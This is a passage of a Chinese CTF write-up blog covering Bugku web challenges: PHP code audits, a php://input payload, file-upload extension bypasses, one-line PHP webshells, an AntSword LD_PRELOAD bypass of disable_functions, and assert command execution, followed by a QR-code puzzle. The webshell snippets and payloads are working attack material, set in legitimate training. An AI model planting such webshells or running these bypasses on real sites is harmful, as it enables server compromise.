<li>为此我们需要构造一个个line&#x3D;n，然后一行行复制下来拼接成为源码，但是也有简单方式，写脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">num =<span class="number">20</span>  //猜测代码有<span class="number">20</span>行</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):  </span><br><span class="line">    url = <span class="string">&quot;http://114.67.175.224:17024/index.php?line=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>  </span><br><span class="line">    re=requests.get(url)  </span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>由此我们获得了网页的php源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);<span class="comment">//base64解码</span></span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;<span class="comment">//读取变量，intval获取输入整数值</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);<span class="comment">//如果没有输入，访问keys.txt</span></span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(<span class="comment">//定义一个文件列表数组包含keys.txt和index.php</span></span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;<span class="comment">//如果有cookie margin=margin</span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;<span class="comment">//文件列表添加元素keys.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;<span class="comment">//如果文件名在文件数组里</span></span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);<span class="comment">//读取这个文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];<span class="comment">//输出这个文件的第url中的line行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>如上注释，审计php代码</li>
<li>可以知道我们需要添加cookie：<code>margin=margin</code>，如何添加cookie？<ul>
<li>打开bp，抓包，send to repeater，</li>
<li>依次点击repeater-&gt;head-&gt;add</li>
<li>添加Cookie:margin&#x3D;margin</li>
</ul>
</li>
<li>send，发现什么都没有</li>
<li>想起来我们文件列表中还添加了一个<code>keys.php</code></li>
<li>base64编码该文件，将它和添加的cookie一起重发</li>
<li>得到flag</li>
</ul>
<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h4><p>没什么好说的，不会，直接上<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/125617813">大佬的WP</a></p>
<p>通过WP学到的点：</p>
<ul>
<li>做题时访问的内部网页进行了重定向，并且重定向到了一个公网IP，说明重定向过程有问题，我们可以对访问的原网页进行一个抓包，本题中为1p.html，抓包后送到bp的repeater模块send一下，就可以看到关键点</li>
<li>对编码的敏感度，需要对编码有一定的熟悉，本题对关键内容进行了多重编码</li>
<li>编码成功解码后，对于解码出来的php代码再次进行审计，这里的代码有很多可以学习的地方：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])<span class="comment">//如果id这个变量为false(0)，则在本if中：</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);<span class="comment">//头部这样改</span></span><br><span class="line">	<span class="keyword">exit</span>();<span class="comment">//然后直接退出本文件，往后代码不执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];<span class="comment">//获取了三个变量</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))<span class="comment">//匹配a变量中的第一个“.”，如果有，返回true，进入该if</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;<span class="comment">//输出错误</span></span><br><span class="line">	<span class="keyword">return</span> ;<span class="comment">//退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);<span class="comment">//这里将变量a的内容输出到data，&#x27;r&#x27;表示读模式(猜测，没有找到相关资料，只知道本函数是将文件内容作为字符串赋给一个变量)，同时我们需要知道，file_get_contents函数的第一个参数，不仅可以是文件，也可以是URL，也就是说，这里我们可以使用伪协议input，</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line"><span class="comment">//这里就是本次代码审计的核心</span></span><br><span class="line"><span class="comment">//首先，我们利用input伪协议使用POST输入bugku is a nice plateform!以满足第一个条件</span></span><br><span class="line"><span class="comment">//其次，id==0，这里使用了弱相等，此时如果我们传入id=0，则无法满足最开始对id的筛选，我们可以利用php弱相等，构造id=0afadfasdf(0开头的任意字符串)，满足第二个条件</span></span><br><span class="line"><span class="comment">//然后，构造b的长度大于5</span></span><br><span class="line"><span class="comment">//接着，eregi函数需要内容匹配成功，这里的第一个参数为“111”.substr($b,0,1)第二个参数为1114，意为我们需要使用111拼接输入的b变量的值的第一位，若为4，到这里，eregi函数返回true</span></span><br><span class="line"><span class="comment">//最后我们需要对b从0处开始截取1位字符，若为4，则返回false</span></span><br><span class="line"><span class="comment">//联合倒数第一个条件和倒数第二个条件，这不是前后矛盾吗？看wp，我们有了两种解决办法：</span></span><br><span class="line"><span class="comment">//方法一：使用*通配符，构造b为*12345,*代表任意字符就可以了</span></span><br><span class="line"><span class="comment">//方法二：使用空白代替</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>审计完毕，我们构造payload<ul>
<li>首先id不能为0但是获得flag需要0==0，我们构造<code>id=0aaaa</code></li>
<li>其次a中不能有“.”,通过以上代码审计我们知道这里可使用伪协议input，于是我们构造<code>a=php:input//</code></li>
<li>最后参考代码注释中的方法构造b，有：<code>b=*123456</code>或<code>b=  123456</code></li>
</ul>
</li>
<li>综上，我们构造payload：<code>?id=0aaa&amp;a=php://input&amp;b=*123456</code></li>
<li>接着使用hackbar或者bp上传post数据为：<code>bugku is a nice plateform!</code></li>
<li>点击send，获得flag</li>
</ul>
<h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><ul>
<li>打开链接，什么都没有，打开源代码，发现<code>upload.php</code></li>
<li>我们访问该文件，发现需要上传指定格式的图片，很明显是需要上传一句话马以获得网页权限，于是我们先构造一句话马，[[#^yijuhuama|这里是构造姿势1]]<ul>
<li>然后开始进行后缀绕过<ul>
<li>绕过姿势1：我们首先修改一句话马后缀为jpg以满足格式要求，然后bp抓包，再次修改文件后缀为.php后再放包</li>
<li>发现上传失败，很明显在后端对后缀又进行了处理</li>
<li>绕过姿势2：我们修改后缀为yijuhuama.php%00.jpg，试图利用00截断来处理掉后缀<ul>
<li>再次失败</li>
</ul>
</li>
<li>绕过姿势3：现学的，我们可以构造php文件上传时的文件名为：<code>yijuhuanma.php;.jpg</code><ul>
<li>注意，这里我们在php后缀后添加了分号，用以结束当前的php语句，同时我们有后缀jpg，又满足了文件上传要求</li>
</ul>
</li>
<li>至此，一句话马上传成功，题目已经给出了文件的上传地址，我们只需要使用中国蚁剑进行连接即可，但是蚁剑连接返回空白</li>
<li>打开图片地址发现一串这样的东西：<code>_@eval($POST[&#39;a&#39;])_</code>,缺少头和尾，很明显对php文件的格式也进行了过滤，我们这里给出其他php代码头构造方式：<ul>
<li>构造方式2：<code>&lt;?=eval($_POST[&#39;shell&#39;]);&gt;</code></li>
<li>构造方式3：<code>&lt;script language=php&gt; @eval($_POST[pupil]); &lt;/script&gt;</code></li>
<li>构造方式4（当蚁剑连接不上时，我们在网页端执行系统命令）：<code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>连接成功，访问根目录拿到flag</li>
</ul>
</li>
</ul>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><ul>
<li>打开题目链接，貌似是php代码，搜索资料得知这里对php代码进行混淆<ul>
<li>由来：<ul>
<li>为了php代码安全，一般会对代码进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>，防止因为别人篡改，导致代码无法正常运行。</li>
</ul>
</li>
<li>混淆方式：<ul>
<li><a target="_blank" rel="noopener" href="http://www.zend.com/en/products/zend-guard">Zend Guard</a>、<a target="_blank" rel="noopener" href="http://www.ioncube.com/">ionCube PHP Encode</a>、<a target="_blank" rel="noopener" href="https://wiki.swoole.com/wiki/index/prid-16">Swoole Compiler</a>、<a target="_blank" rel="noopener" href="https://github.com/Luavis/php-screw">PHP Screw</a>、<a target="_blank" rel="noopener" href="http://www.jianshu.com/p/f6425e2f8643">PHP Screw plus</a>、<a target="_blank" rel="noopener" href="https://github.com/liexusong/php-beast">PHP Beast</a>等这些混淆方式，前3种收费，后3种免费。</li>
</ul>
</li>
<li>解密：<ul>
<li><a target="_blank" rel="noopener" href="http://www.zhaoyuanma.com/phpjm.html">php解密加密</a></li>
</ul>
</li>
</ul>
</li>
<li>我们使用工具解密并下载解密后代码，打开看到这样的文件：<ul>
<li><code>&lt;?phphighlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);@eval($_POST[ymlisisisiook]);</code></li>
<li>可以注意到最后一个函数，正是一个一句话马</li>
</ul>
</li>
<li><h2 id="我们使用中国蚁剑连接该马-连接成功-访问根目录，访问失败，这是怎么回事？-看wp，得知在此处设置了disablefunction函数，导致我们不能访问根目录，那么我们怎么访问phpinfo和怎么绕过disablefunction函数？-打开中国蚁剑，挂上代理访问插件市场-下载插件phpinfo和绕过disablefunction-打开连接列表，右键题目连接，加载插件，首先我们加载PHPinfo插件-打开页面，向下翻找可以看到：disable-functions-pcntl-alarm-pcntl-fork-pentl-waitpid-pentl-wait-pentl-wifexited-pentl-wifstopped-pcntl-wifsignaled-ini-set-pcntl-wifcontinued-pcntl-wexitstatus-pcntl-w-很明显函数都被禁用的差不多了，所以我们使用下一个插件进行绕过-右键连接加载该绕过插件，绕过方式选择LD-Preload-什么是LD-PRELOAD-搜索资料得知，该变量为Linux系统在加载动态连接库时最先加载的变量，拥有最高优先级，猜测这里利用这一点绕过-执行绕过-绕过成功后，我们看到蚁剑上传了一个-antProxy-php的文件，翻译就是蚁剑的代理，此时，我们再次新建连接，使用题目连接-antproxy-php，密码还是一句话马中那个密码-绕过成功-翻阅根目录，得到flag"><a href="#我们使用中国蚁剑连接该马-连接成功-访问根目录，访问失败，这是怎么回事？-看wp，得知在此处设置了disablefunction函数，导致我们不能访问根目录，那么我们怎么访问phpinfo和怎么绕过disablefunction函数？-打开中国蚁剑，挂上代理访问插件市场-下载插件phpinfo和绕过disablefunction-打开连接列表，右键题目连接，加载插件，首先我们加载PHPinfo插件-打开页面，向下翻找可以看到：disable-functions-pcntl-alarm-pcntl-fork-pentl-waitpid-pentl-wait-pentl-wifexited-pentl-wifstopped-pcntl-wifsignaled-ini-set-pcntl-wifcontinued-pcntl-wexitstatus-pcntl-w-很明显函数都被禁用的差不多了，所以我们使用下一个插件进行绕过-右键连接加载该绕过插件，绕过方式选择LD-Preload-什么是LD-PRELOAD-搜索资料得知，该变量为Linux系统在加载动态连接库时最先加载的变量，拥有最高优先级，猜测这里利用这一点绕过-执行绕过-绕过成功后，我们看到蚁剑上传了一个-antProxy-php的文件，翻译就是蚁剑的代理，此时，我们再次新建连接，使用题目连接-antproxy-php，密码还是一句话马中那个密码-绕过成功-翻阅根目录，得到flag" class="headerlink" title="我们使用中国蚁剑连接该马  - 连接成功  - 访问根目录，访问失败，这是怎么回事？  - 看wp，得知在此处设置了disablefunction函数，导致我们不能访问根目录，那么我们怎么访问phpinfo和怎么绕过disablefunction函数？      - 打开中国蚁剑，挂上代理访问插件市场      - 下载插件phpinfo和绕过disablefunction      - 打开连接列表，右键题目连接，加载插件，首先我们加载PHPinfo插件          - 打开页面，向下翻找可以看到：disable_functions:pcntl alarm.pcntl fork,pentl waitpid,pentl wait pentl wifexited.pentl wifstopped,pcntl wifsignaled,ini set,pcntl_wifcontinued.pcntl_wexitstatus.pcntl_w.......      - 很明显函数都被禁用的差不多了，所以我们使用下一个插件进行绕过          - 右键连接加载该绕过插件，绕过方式选择LD_Preload          - 什么是LD_PRELOAD              - 搜索资料得知，该变量为Linux系统在加载动态连接库时最先加载的变量，拥有最高优先级，猜测这里利用这一点绕过          - 执行绕过          - 绕过成功后，我们看到蚁剑上传了一个.antProxy.php的文件，翻译就是蚁剑的代理，此时，我们再次新建连接，使用题目连接+/.antproxy.php，密码还是一句话马中那个密码      - 绕过成功  - 翻阅根目录，得到flag"></a>我们使用中国蚁剑连接该马<br>  - 连接成功<br>  - 访问根目录，访问失败，这是怎么回事？<br>  - 看wp，得知在此处设置了disablefunction函数，导致我们不能访问根目录，那么我们怎么访问phpinfo和怎么绕过disablefunction函数？<br>      - 打开中国蚁剑，挂上代理访问插件市场<br>      - 下载插件<code>phpinfo</code>和<code>绕过disablefunction</code><br>      - 打开连接列表，右键题目连接，加载插件，首先我们加载PHPinfo插件<br>          - 打开页面，向下翻找可以看到：<code>disable_functions:pcntl alarm.pcntl fork,pentl waitpid,pentl wait pentl wifexited.pentl wifstopped,pcntl wifsignaled,ini set,pcntl_wifcontinued.pcntl_wexitstatus.pcntl_w.......</code><br>      - 很明显函数都被禁用的差不多了，所以我们使用下一个插件进行绕过<br>          - 右键连接加载该绕过插件，绕过方式选择<code>LD_Preload</code><br>          - <a target="_blank" rel="noopener" href="https://ivanzz1001.github.io/records/post/linux/2018/04/08/linux-ld-preload">什么是LD_PRELOAD</a><br>              - 搜索资料得知，该变量为Linux系统在加载动态连接库时最先加载的变量，拥有<em>最高优先级</em>，猜测这里利用这一点绕过<br>          - 执行绕过<br>          - 绕过成功后，我们看到蚁剑上传了一个<code>.antProxy.php</code>的文件，翻译就是蚁剑的代理，此时，我们再次新建连接，使用题目连接+<code>/.antproxy.php</code>，密码还是一句话马中那个密码<br>      - 绕过成功<br>  - 翻阅根目录，得到flag</h2></li>
</ul>
<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><ul>
<li>看题目的描述即可知道这里利用assert函数执行其他php函数</li>
<li>我们构造assert函数的参数system(“ls”)</li>
<li>拿到文件列表，看到有flag.txt</li>
<li>浏览器直接访问或继续构造cat &#x2F;flag.txt拿到flag</li>
</ul>
<h4 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h4><ul>
<li>基本的脚本编造</li>
<li>首先我们打开题目链接，看到一串大数字运算，要求在两秒内计算出，很明显不可能，我们需要编写脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#导入网络请求库  </span></span><br><span class="line"><span class="keyword">import</span> re  <span class="comment">#导入正则表达书库  </span></span><br><span class="line">s = requests.session() <span class="comment">#保持会话为当前会话，这一点很重要，否则表达式将刷新</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:12765/&quot;</span>  <span class="comment">#url地址  </span></span><br><span class="line">r = s.get(url)  <span class="comment">#以get方式请求当前session会话的响应到r  </span></span><br><span class="line">r.encoding=<span class="string">&#x27;utf-8&#x27;</span>  <span class="comment">#对响应进行utf8编码，避免乱码  </span></span><br><span class="line">c = r.text  <span class="comment">#拿到编码后的返回内容  </span></span><br><span class="line"><span class="built_in">print</span>(c)  </span><br><span class="line">n = re.findall(<span class="string">r&#x27;\d.*?=&#x27;</span>,c)[<span class="number">0</span>]  <span class="comment">#开始正则匹配，findall以数组形式返回所有符合条件的字符串，我们这里只有一个字符串，因此本行代码最后为[0]，findall中第一个参数为匹配规则，前置r代表以原生内容进行匹配而不对内部特殊字符进行转义，r后即为正则表达式，第二个参数为需要匹配的字符串c</span></span><br><span class="line"><span class="built_in">print</span>(n)  </span><br><span class="line">e = re.sub(<span class="string">&quot;[=]&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(n))  <span class="comment">#匹配结束删掉返回字符串最后的等号  </span></span><br><span class="line">e = <span class="built_in">eval</span>(e)  <span class="comment">#执行该计算  </span></span><br><span class="line"><span class="built_in">print</span>(e)  </span><br><span class="line">o = s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:e&#125;)  <span class="comment">#使用post方式提交e值  </span></span><br><span class="line"><span class="built_in">print</span>(o.text)</span><br></pre></td></tr></table></figure>

<ul>
<li>返回flag</li>
</ul>
<h4 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h4><p>打开题目为代码审计，点击click后观察url发现flag参数，明显需要构造flag参数以绕过如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;    <span class="variable">$exam </span>= <span class="string">&#x27;return\&#x27;&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;\&#x27;;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class="variable">$exam</span>.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span><span class="title function_ invoke__"> if </span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$exam</span>)) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;长度不允许&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span><span class="title function_ invoke__"> if </span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;关键字不允许&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span><span class="title function_ invoke__"> if </span>(<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$flag</span>)) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;马老师发生甚么事了&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>观察代码，大致流程如下：</p>
<ul>
<li>包含flag.php,构造exam为当前时间的sha1值，长度为40</li>
<li>判断是否有flag参数存在，若不存在，添加一个超链接标签包含flag，包含exam，exam为构造的参数，长度为49位（包含sha140位，拼接字符串9位）</li>
<li>判断flag的长度是否和exam相等</li>
<li>判断是否存在关键字</li>
<li>如果flag的值执行出来等于sha1的flag值，输出flag</li>
</ul>
<p>基于以上代码流程，我们开始构造payload：</p>
<ul>
<li>我们留意到，最后一个内部逻辑判断存在eval，可以执行任意php代码</li>
<li>既然存在flag变量，我们直接把它使用eval函数打印出来就好，怎么打印？</li>
<li>由于flag被作为关键词过滤，导致我们想输出要花点心思：<ul>
<li>使用可变变量绕过，我们声明一个变量a，值为<code>flxg</code>，然后<code>a&#123;2&#125;=a</code>，这里使用花括号是因为中括号也已经被过滤。如此我们就构造了一个值为’flag’的变量a,然后想到使用<code>$$a</code>利用短标签php输出，</li>
<li>构造一个与payload相加满足长度要求的无关数字串绕过长度限制</li>
<li>得到flag</li>
</ul>
</li>
<li>完整payload：<code>$a=&#39;flxg&#39;;a&#123;2&#125;=&#39;a&#39;;111111111111111111;?&gt;&lt;?=$$a;?&gt;</code></li>
</ul>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1和0的故事"><a href="#1和0的故事" class="headerlink" title="1和0的故事"></a>1和0的故事</h4><ul>
<li><p>下载文件，打开后得到：<br>0000000001110010000000000<br>0000000000011110100000000<br>0000000001110001000000000<br>0000000010111100000000000<br>0000000010101010000000000<br>0000000001100010100000000<br>0000000010101010100000000<br>0000000001000001100000000<br>1100011101110110100011000<br>0001000010110010010010100<br>0100111101000011101110011<br>0011110100101011001001001<br>1000001001100001001101000<br>1111000111111011100101000<br>1011011111001101111110111<br>1000110110010010101101100<br>1000111100111111111110111<br>0000000010110001100010100<br>0000000010010100101010001<br>0000000010101010100011001<br>0000000000100111111110010<br>0000000000011001011110111<br>0000000001001100100100001<br>0000000011000011011011001<br>0000000011010000101110101</p>
</li>
<li><p>是一个25x25的方阵，看wp发现符合二维码，需要对它进行二维码转换</p>
<ul>
<li>如何转换？使用■和□分别替换1和0，代码演示（也可以放到word中直接替换）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">instead</span>(<span class="params">fn</span>):  </span><br><span class="line">    <span class="built_in">print</span>(fn[<span class="number">11</span>])  </span><br><span class="line">    fnew=<span class="built_in">open</span>(<span class="string">&quot;anew.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">    count = <span class="number">1</span>  </span><br><span class="line">    j =<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fn:  </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;1&quot;</span>:  </span><br><span class="line">            fnew.write(<span class="string">&quot;■&quot;</span>)  </span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&quot;0&quot;</span>:  </span><br><span class="line">            fnew.write(<span class="string">&quot;□&quot;</span>)  </span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">26</span>*j:  </span><br><span class="line">            j+=<span class="number">1</span>  </span><br><span class="line">            fnew.write(<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(count)  </span><br><span class="line">        count+=<span class="number">1</span>  </span><br><span class="line">    fnew.close()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    ff = f.read()  </span><br><span class="line">instead(ff)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>转换结果</p>
<ul>
<li>这里使用了wps打开，使用记事本打开是长方形</li>
<li>二维码特性需要定位符,搜索即可得到</li>
<li>使用ps调整wps中截出来的图为正方形</li>
<li>附上定位符，缩放</li>
<li>扫码获得flag</li>
</ul>
</li>
</ul>
<h4 id="简单取证1"><a href="#简单取证1" class="headerlink" title="简单取证1"></a>简单取证1</h4><ul>
<li>下载附件后解压发现是一个config文件打开</li>
<li>查看博客发现是windows系统的用户名密码等文件文件夹</li>
<li>进行破解获取用户名跟和密码<ul>
<li>如何破解？                   <ul>
